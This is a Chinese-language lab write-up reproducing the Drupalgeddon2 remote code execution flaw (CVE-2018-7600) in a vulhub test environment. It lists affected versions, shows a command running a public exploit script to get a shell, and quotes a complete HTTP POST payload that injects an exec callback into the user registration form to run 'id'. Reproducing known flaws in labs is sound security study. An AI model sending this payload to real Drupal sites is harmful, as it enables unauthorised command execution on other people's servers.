# 0x00 复现环境
使用复现环境：https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600

# 0x01 利用条件
无

# 0x02 影响版本
7.23<=7.x<=7.57  
8.3.x<=8.3.8  
8.4.x<=8.4.5  
8.5.x<=8.5.0

# 0x03 漏洞复现
执行“ruby ./drupalggedon2.rb http://172.16.35.128:8080”  
会返回一个shell，可在返回的shell中执行命令，如下图  
![image](./0.png)

# 0x04 踩坑记录
坑1：  
环境创建完之后，使用kali下的firefox访问127.0.0.1:8080时，burp不能抓到数据包，原因未知，解决方案：使用kali下的firefox访问局域网ip“172.16.35.128:8080”  
坑2：  
登录状态下使用vulhub中的poc无效，需要登出后才可执行命令id，vulhub中的poc如下:  
```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```
坑3：  
使用vulhub中的poc执行命令“ls”，只能看到一个文件“web.config”，执行命令“ls -a /”也只能看到一个文件“var”

# 参考链接
https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
